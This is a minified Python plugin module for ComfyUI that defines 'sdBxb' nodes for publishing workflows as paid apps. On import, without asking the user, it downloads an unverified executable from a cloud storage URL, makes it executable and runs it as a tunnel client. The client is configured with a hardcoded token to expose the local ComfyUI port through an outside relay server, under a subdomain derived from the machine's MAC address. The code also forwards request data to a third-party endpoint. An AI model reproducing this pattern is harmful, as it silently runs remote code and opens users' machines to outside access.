_L='sdBxb_textInput'
_K='required'
_J='connected'
_I='Windows'
_H='placeholder'
_G='sdBxb'
_F=None
_E=True
_D='default'
_C='multiline'
_B='STRING'
_A=False
import aiohttp,server
from aiohttp import web
import subprocess,os,time,threading
from collections import deque
import uuid,sys,re,hashlib,platform,stat,urllib.request
def get_mac_address():B=uuid.getnode();return':'.join(('%012X'%B)[A:A+2]for A in range(0,12,2))
def get_port_from_cmdline():
	for(A,B)in enumerate(sys.argv):
		if B=='--port'and A+1<len(sys.argv):
			try:return int(sys.argv[A+1])
			except ValueError:pass
		C=re.search('--port[=\\s]*(\\d+)',B)
		if C:
			try:return int(C.group(1))
			except ValueError:pass
	return 8188
def generate_unique_subdomain(mac_address,port):'根据 MAC 地址和端口号生成唯一的子域名';A=f"{mac_address}:{port}";B=hashlib.sha256(A.encode());C=B.hexdigest()[:12];return C
def set_executable_permission(file_path):
	A=file_path
	try:B=os.stat(A);os.chmod(A,B.st_mode|stat.S_IXUSR|stat.S_IXGRP|stat.S_IXOTH);print(f"Execution permissions set on {A}")
	except Exception as C:print(f"Failed to set execution permissions: {C}")
def download_file(url,dest_path):
	'使用 urllib 下载文件到指定路径';A=dest_path
	try:
		with urllib.request.urlopen(url)as B,open(A,'wb')as C:D=B.read();C.write(D)
		print(f"File downloaded successfully: {A}")
	except Exception as E:print(f"Failed to download the file: {E}")
PLUGIN_DIR=os.path.dirname(os.path.abspath(__file__))
SD_CLIENT_DIR=os.path.join(PLUGIN_DIR,'sdc')
SDC_EXECUTABLE=os.path.join(SD_CLIENT_DIR,'sdc'if platform.system()!=_I else'sdc.exe')
INI_FILE=os.path.join(SD_CLIENT_DIR,'sdc.toml')
LOG_FILE=os.path.join(SD_CLIENT_DIR,'sdc.log')
class SDClient:
	RED='\x1b[91m';RESET='\x1b[0m'
	def __init__(A,local_port,subdomain):A.local_port=local_port;A.server_addr='suidao.9syun.com';A.server_port='7000';A.token='my_secure_token';A.subdomain=subdomain;A.sd_process=_F;A.connected=_A;A.monitoring_thread=_F;A.stop_monitoring=_A
	def create_sdc_ini(A,file_path,subdomain):
		'生成 sdc.toml 文件';B=subdomain;C=f'''
[common]
server_addr = "{A.server_addr}"
server_port = {A.server_port}
token = "{A.token}"
login_fail_exit = false

[{B}]
type = "http"
local_port = {A.local_port}
subdomain = "{B}"
remote_port = 0
log_file = "{LOG_FILE}"
log_level = "info"
'''
		with open(file_path,'w')as D:D.write(C)
	def tail_log(B,filename,num_lines=20):
		'获取日志文件的最后几行'
		try:
			with open(filename,'r')as A:return deque(A,num_lines)
		except FileNotFoundError:return deque()
	def check_sd_log_for_status(D):
		'检查日志文件中是否包含连接成功或失败的标志性信息';C='disconnected';E=['login to server success','start proxy success'];K=['connect to server error','read tcp','session shutdown'];F=re.compile('try to connect to server');B=D.tail_log(LOG_FILE,20);A=_F
		for(G,H)in enumerate(B):
			if F.search(H):A=G
		if A is not _F and A+1<len(B):
			I=B[A+1]
			for J in E:
				if J in I:return _J
			return C
		return C
	def check_and_download_executable(A):
		if platform.system()!=_I:
			if not os.path.exists(SDC_EXECUTABLE):print('SDC executable not found, downloading...');download_file('https://tt-1254127940.file.myqcloud.com/tech_huise/66/qita/sdc',SDC_EXECUTABLE);set_executable_permission(SDC_EXECUTABLE)
	def start(A):
		'启动 SD 客户端';A.check_and_download_executable();A.create_sdc_ini(INI_FILE,A.subdomain);open(LOG_FILE,'w').close();B=os.environ.copy();B['http_proxy']='';B['https_proxy']='';B['no_proxy']='*'
		try:
			with open(LOG_FILE,'a')as C:A.sd_process=subprocess.Popen([SDC_EXECUTABLE,'-c',INI_FILE],stdout=C,stderr=C,env=B)
			print(f"SD client started with PID: {A.sd_process.pid}");A.stop_monitoring=_A;A.monitoring_thread=threading.Thread(target=A.monitor_connection_status,daemon=_E);A.monitoring_thread.start()
		except FileNotFoundError:print(f"Error: '{SDC_EXECUTABLE}' not found。")
		except Exception as D:print(f"Error starting SD client: {D}")
	def monitor_connection_status(A):
		'监测 SD 连接状态'
		while not A.stop_monitoring:
			B=A.check_sd_log_for_status()
			if B==_J:
				if not A.connected:print(f"SD client successfully connected with PID: {A.sd_process.pid}");A.connected=_E
			elif A.connected:print(f"{A.RED}Waiting for SD client to connect...{A.RESET}");A.connected=_A
			time.sleep(1)
	def stop(A):
		'停止 SD 客户端并终止监控线程'
		if A.sd_process and A.sd_process.poll()is _F:A.sd_process.terminate();A.sd_process.wait();print('SD client stopped。')
		else:print('SD client is not running。')
		A.connected=_A;A.stop_monitoring=_E
	def is_connected(A):'检查 SD 客户端是否连接成功';return A.connected
	def clear_log(A):
		'清理日志文件'
		if os.path.exists(LOG_FILE):open(LOG_FILE,'w').close();print('SD client log cleared。')
subdomain=''
if platform.system()!='Darwin':local_port=get_port_from_cmdline();subdomain=generate_unique_subdomain(get_mac_address(),local_port);sd_client=SDClient(local_port=local_port,subdomain=subdomain);sd_client.start()
@server.PromptServer.instance.routes.post('/manager/tech_zhulu')
async def tech_zhulu(request):
	C='postData';A=await request.json()
	if C in A and isinstance(A[C],dict):A[C]['subdomain']=subdomain
	async with aiohttp.ClientSession()as D:
		async with D.post('https://tt.9syun.com/app/index.php?i=66&t=0&v=1.0&from=wxapp&tech_client=wx&c=entry&a=wxapp&tech_client=sj&do=ttapp&m=tech_huise&r='+A['r']+'&techsid=we7sid-'+A['techsid'],json=A)as B:
			if B.status==200 and B.headers.get('Content-Type')=='application/json':
				try:E=await B.json();return web.json_response(E)
				except aiohttp.ContentTypeError:F=await B.text();return web.Response(text=F,status=400)
			else:return web.Response(status=B.status,text=await B.text())
class sdBxb:
	def __init__(A):0
	@classmethod
	def INPUT_TYPES(F):E='请输入文本';D='请上传图片';C='dynamicPrompts';B='forceInput';A='IMAGE';return{_K:{'app_title':(_B,{_C:_A,_D:'这是默认作品标题，请在comfyui中修改',_H:''}),'app_desc':(_B,{_C:_A,_D:'这是默认功能介绍，请在comfyui中修改',_H:''}),'app_fee':('INT',{_D:18,'min':10,'max':999999,'step':1,'display':'number'})},'optional':{'app_img1(optional)':(A,),'app_img2(optional)':(A,),'app_img3(optional)':(A,),'custom_img1(optional)':(A,),'custom_img2(optional)':(A,),'custom_img3(optional)':(A,),'custom_text1(optional)':(_B,{_C:_A,B:_E,C:_A}),'custom_text2(optional)':(_B,{_C:_A,B:_E,C:_A}),'custom_text3(optional)':(_B,{_C:_A,B:_E,C:_A}),'custom_img1_desc':(_B,{_C:_A,_D:D}),'custom_img2_desc':(_B,{_C:_A,_D:D}),'custom_img3_desc':(_B,{_C:_A,_D:D}),'custom_text1_desc':(_B,{_C:_A,_D:E}),'custom_text2_desc':(_B,{_C:_A,_D:E}),'custom_text3_desc':(_B,{_C:_A,_D:E})},'hidden':{'custom_text333333':(_B,{_C:_A,_D:'输入文本'})}}
	RETURN_TYPES=();CATEGORY=_G
class sdBxb_textInput:
	def __init__(A):0
	@classmethod
	def INPUT_TYPES(A):return{_K:{'text':(_B,{_D:'',_C:_E,_H:'文本输入'})}}
	RETURN_TYPES=_B,;FUNCTION='main';CATEGORY=_G
	@staticmethod
	def main(text):return text,
WEB_DIRECTORY='./web'
NODE_CLASS_MAPPINGS={_G:sdBxb,_L:sdBxb_textInput}
NODE_DISPLAY_NAME_MAPPINGS={_G:_G,_L:'textInput'}